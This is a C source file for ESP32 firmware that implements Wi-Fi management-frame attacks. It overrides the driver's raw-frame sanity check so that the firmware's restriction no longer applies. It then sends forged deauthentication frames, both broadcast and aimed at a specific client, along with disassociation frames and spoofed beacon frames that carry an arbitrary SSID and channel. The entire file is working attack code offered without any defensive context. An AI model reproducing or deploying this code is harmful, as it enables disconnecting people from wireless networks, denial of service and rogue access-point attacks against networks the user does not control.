#include "wsl_bypasser.h"
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_wifi.h"
#include <string.h>

static const char *TAG = "wsl_bypasser";

static const uint8_t deauth_frame_default[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
};

int __wrap_ieee80211_raw_frame_sanity_check(int ifx, const void *buffer, int len, bool auto_seq) {
    (void)ifx; (void)buffer; (void)len; (void)auto_seq;
    return 0;
}

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
    if (err != ESP_OK) {
        ESP_LOGV(TAG, "Frame TX err: %s", esp_err_to_name(err));
    }
}

void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record) {
    uint8_t frame[sizeof(deauth_frame_default)];
    memcpy(frame, deauth_frame_default, sizeof(deauth_frame_default));
    memcpy(&frame[10], ap_record->bssid, 6);
    memcpy(&frame[16], ap_record->bssid, 6);
    wsl_bypasser_send_raw_frame(frame, sizeof(frame));
}

void wsl_bypasser_send_beacon_frame(uint8_t *bssid, uint8_t *ssid, uint8_t ssid_length, uint8_t channel) {
    uint8_t frame[128] = {
        0x80, 0x00, 0x00, 0x00,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x64, 0x00, 0x01, 0x04,
        0x00, 0x00
    };
    
    memcpy(&frame[10], bssid, 6);
    memcpy(&frame[16], bssid, 6);
    frame[37] = ssid_length;
    if (ssid_length > 0 && ssid_length <= 32) {
        memcpy(&frame[38], ssid, ssid_length);
    }
    
    uint16_t frame_len = 38 + ssid_length;
    frame[frame_len++] = 0x03;
    frame[frame_len++] = 0x01;
    frame[frame_len++] = channel;
    
    esp_wifi_80211_tx(WIFI_IF_STA, frame, frame_len, false);
}

void wsl_bypasser_send_deauth_targeted(const uint8_t *ap_bssid, const uint8_t *client_mac) {
    uint8_t frame[26];
    memcpy(frame, deauth_frame_default, 26);
    memcpy(&frame[4], client_mac, 6);
    memcpy(&frame[10], ap_bssid, 6);
    memcpy(&frame[16], ap_bssid, 6);
    wsl_bypasser_send_raw_frame(frame, 26);
}

void wsl_bypasser_send_disassociation_frame(const uint8_t *ap_bssid, const uint8_t *client_mac) {
    uint8_t frame[] = {
        0xa0, 0x00, 0x3a, 0x01,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xf0, 0xff, 0x01, 0x00
    };
    memcpy(&frame[4], client_mac, 6);
    memcpy(&frame[10], ap_bssid, 6);
    memcpy(&frame[16], ap_bssid, 6);
    wsl_bypasser_send_raw_frame(frame, sizeof(frame));
}
